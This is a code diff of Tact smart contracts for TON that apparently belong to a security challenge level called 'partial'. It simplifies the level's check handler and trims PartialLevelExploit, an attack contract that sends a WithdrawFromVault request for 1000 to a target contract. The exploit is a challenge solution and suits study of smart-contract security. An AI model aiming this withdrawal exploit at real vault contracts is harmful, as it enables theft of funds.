@@ -90,14 +90,6 @@ contract PartialLevel with Deployable {
 
     receive("check"){
         self.completed = self.balance >= 1000;
-        // send(SendParameters{
-        //         to: sender(),
-        //         value: 0,
-        //         mode: SendRemainingValue,
-        //         bounce: false,
-        //         body: CheckLevelResult{name: "partial", completed: self.balance >= 1000}.toCell()
-        //     }
-        // );
     }
 
     get fun balance(): Int {
@@ -115,6 +107,5 @@ message Exploit {
 contract PartialLevelExploit {
     receive(msg: Exploit){
         send(SendParameters{to: msg.target, value: ton("0.1"), body: WithdrawFromVault{amount: 1000}.toCell()});
-        send(SendParameters{to: msg.target, value: ton("0.1"), body: "check".asComment()});
     }
 }
